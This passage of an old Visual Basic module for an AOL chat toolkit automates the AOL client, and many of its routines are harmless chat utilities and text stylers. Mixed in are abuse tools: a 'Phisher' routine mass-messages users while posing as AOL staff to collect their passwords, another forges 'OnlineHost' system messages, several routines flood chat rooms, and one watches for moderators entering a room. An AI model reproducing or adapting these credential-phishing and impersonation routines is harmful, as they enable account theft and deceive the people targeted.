AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥ ß¥ (¥)ï§†ê®}{8ë®" & Chr(4) & "/-=!=-\"
End Sub


Function AOLFindRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone

firs% = GetWindow(MDI%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
listere% = GetWindow(listers%, 2)
listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And listere% And listerb% Then GoTo bone
Wend

bone:
Room% = firs%
AOLFindRoom = Room%
End Function

Function AOLGetCurrentRoomName()
X = GetCaption(FindChatRoom())
AOLGetCurrentRoomName = X
End Function

Sub AOLGuideWatch()
'From My friends bas Kin2000
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call KeyWord("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub

Sub AOLHostManipulator(what$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
View% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "OnlineHost:" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(View%, WM_SETTEXT, 0, Buffy$)
End Sub

Sub AOLChatsend1(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub
Sub AOLChatsend2(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub AOLClickIcon(Icon%)
Clck% = SendMessage(Icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(Icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Function AOLClickList(hwnd)
'clicks a list
ClickList% = SendMessageByNum(hwnd, &H203, 0, 0&)
End Function

Function AOLCountMail()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function AOLMDI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(AOL%, "MDIClient")
End Function

Public Sub AOLEightLine(txt As TextBox)
'a simple 8 line scroller
a = String(116, Chr(32))
D = 116 - Len(txt)
c$ = Left(a, D)
SendChat "" + txt.text + "" & c$ & "" + txt.text + ""

SendChat "" + txt.text + "" & c$ & "" + txt.text + ""

SendChat "" + txt.text + "" & c$ & "" + txt.text + ""

SendChat "" + txt.text + "" & c$ & "" + txt.text + ""
TimeOut 2

End Sub

Function FindChildByClass(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone

While firs%
firss% = GetWindow(parentw, 5)
If UCase(Mid(GetClass(firss%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(Mid(GetClass(firs%), 1, Len(childhand))) Like UCase(childhand) Then GoTo bone
Wend
FindChildByClass = 0

bone:
Room% = firs%
FindChildByClass = Room%

End Function

Function Findchildbytitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
Findchildbytitle = 0

bone:
Room% = firs%
Findchildbytitle = Room%
End Function

Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowTextB(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Function FindForwardWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = Findchildbytitle(childfocus%, "Send Now")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function


Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = Findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = Findchildbytitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = Findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)

GetClass = buffer$
End Function



Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function


Sub HideAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 0)
End Sub



Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub


Function Last_Line()
'duh this will get the text from
'the last chatline , used in many
'bots and shit like that
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function


Function Screen_Name()
'duh this will get the text from
'the last chatline with the sn
' used in many bots and shit like that
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function

Sub PhreakyAttention(text)

SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & text)
SendChat ("<I>" & text)
SendChat ("<U>" & text)
SendChat ("<S>" & text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub


Sub Phisher(List As ListBox)
List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call AimIM(List.text, "Hello, And welcome to America Online.  I am Brad Michaels from AOL System Integrity, and due to Billing Errors we have failed to recieve your account password.  To correct this situation please click on respond and enter your current account password.  Respond within 2 minutes to keep this connection active.   Thank you for your help and enjoy America Online!")
TimeOut 1.5
Next MassIM1
List.Enabled = True
End Sub

Function R_Elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If NextChr$ = "A" Then Let NextChr$ = "/\"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "ð"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "H" Then Let NextChr$ = "|-|"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "M" Then Let NextChr$ = "]V["
If NextChr$ = "m" Then Let NextChr$ = "^^"
If NextChr$ = "N" Then Let NextChr$ = "/\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "ö"
If NextChr$ = "P" Then Let NextChr$ = "¶"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "µ"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "¿"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "¹"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "²"
If NextChr$ = "3" Then Let NextChr$ = "³"
If NextChr$ = "_" Then Let NextChr$ = "¯"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "<" Then Let NextChr$ = "«"
If NextChr$ = ">" Then Let NextChr$ = "»"
If NextChr$ = "*" Then Let NextChr$ = "¤"
If NextChr$ = "`" Then Let NextChr$ = "“"
If NextChr$ = "'" Then Let NextChr$ = "”"
If NextChr$ = "0" Then Let NextChr$ = "º"
Let newsent$ = newsent$ + NextChr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function
Function r_elite2(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If NextChr$ = "A" Then Let NextChr$ = "/\"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "ð"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "H" Then Let NextChr$ = "|-|"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "M" Then Let NextChr$ = "]V["
If NextChr$ = "m" Then Let NextChr$ = "^^"
If NextChr$ = "N" Then Let NextChr$ = "/\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "ö"
If NextChr$ = "P" Then Let NextChr$ = "¶"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "µ"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "¿"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "¹"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "²"
If NextChr$ = "3" Then Let NextChr$ = "³"
If NextChr$ = "_" Then Let NextChr$ = "¯"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
If NextChr$ = "<" Then Let NextChr$ = "«"
If NextChr$ = ">" Then Let NextChr$ = "»"
If NextChr$ = "*" Then Let NextChr$ = "¤"
If NextChr$ = "`" Then Let NextChr$ = "“"
If NextChr$ = "'" Then Let NextChr$ = "”"
If NextChr$ = "0" Then Let NextChr$ = "º"
Let newsent$ = newsent$ + NextChr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function

Function R_Hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$
Loop
BoldBlackBlueBlack (newsent$)


End Function
Function R_Spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let NextChr$ = NextChr$ + " "
Let newsent$ = newsent$ + NextChr$
Loop
 BoldRedBlackRed (newsent$)

End Function


Function RGB2HEX(R, G, B)
    Dim X&
    Dim xx&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = B
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = R
        For xx& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next xx&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function

'Preset 2-3 color fade hexcode generator


Function RGBtoHEX(RGB)
    a = Hex(RGB)
    B = Len(a)
    If B = 5 Then a = "0" & a
    If B = 4 Then a = "00" & a
    If B = 3 Then a = "000" & a
    If B = 2 Then a = "0000" & a
    If B = 1 Then a = "00000" & a
    RGBtoHEX = a
End Function




Public Function RoomCount() As Long
    Dim AOL As Long, MDI As Long, rMail As Long, rList As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindRoom
    rList& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(rList&, LB_GETCOUNT, 0&, 0&)
    RoomCount& = Count&
End Function

Public Sub RunMenu(TopMenu As Long, SubMenu As Long)
    Dim AOL As Long, aMenu As Long, sMenu As Long, mnID As Long
    Dim mVal As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    sMenu& = GetSubMenu(aMenu&, TopMenu&)
    mnID& = GetMenuItemID(sMenu&, SubMenu&)
    Call SendMessageLong(AOL&, WM_COMMAND, mnID&, 0&)
End Sub


Function ScrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Scrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = scrambled$

Exit Function
End Function
Function Scramble(word$, frm As Form, lbl As Label) As String
Dim Where, SEP$, i, SHIT$
Static Words(256) As String
Static Dick(256) As String
word$ = word$
word$ = word$ + " "
Do
    Where = InStr(UCase$(word$), UCase$(" "))
    If Where = False Then Exit Do
    SEP$ = (Mid$(word$, 1, Where - 1))
    X = X + 1
    Words$(X) = (SEP$)
    word$ = Mid$(word$, Where + 1)
Loop
For i = 1 To X
    Dick$(i) = ScrambleWord(Words(i))
Next i
For i = 1 To X
    SHIT$ = SHIT$ + Dick$(i) + " "
Next i
SHIT$ = (SHIT$)
'frm.lbl.Caption = Trim$(shit$)
End Function
Sub AOL30_Signoff()
Call RunMenu(2, 0)
End Sub


Function ScrambleWord(word$)
Dim S, TAK, Y, p, Q, F, W, TEMPT
Static letter(1000)
Static KK(1000)
S = word$
TAK = 0
For Y = 1 To Len(S)
p = p + 1
letter(p) = Mid(S, Y, 1)
Next Y
For Q = 1 To Len(S) '- 1
againdood:
Randomize Timer
F = Int(Rnd * Len(S) + 1)
If F = 0 Then GoTo againdood
For W = 0 To TAK
If F = KK(W) Then GoTo againdood
Next W
TAK = TAK + 1
KK(TAK) = F
TEMPT = TEMPT & letter(F)
Next Q
End Function
Sub ScrollingCredits(lbl As Label)
lbl.Height = Val(lbl.Height) + 10
End Sub

Sub SendChat(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub


Sub Send(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub



Sub SendCharNum(win, chars)
e = SendMessageByNum(win, WM_CHAR, chars, 0)
End Sub


Public Sub RunMenuByString(SearchString As String)
    Dim AOL As Long, aMenu As Long, mCount As Long
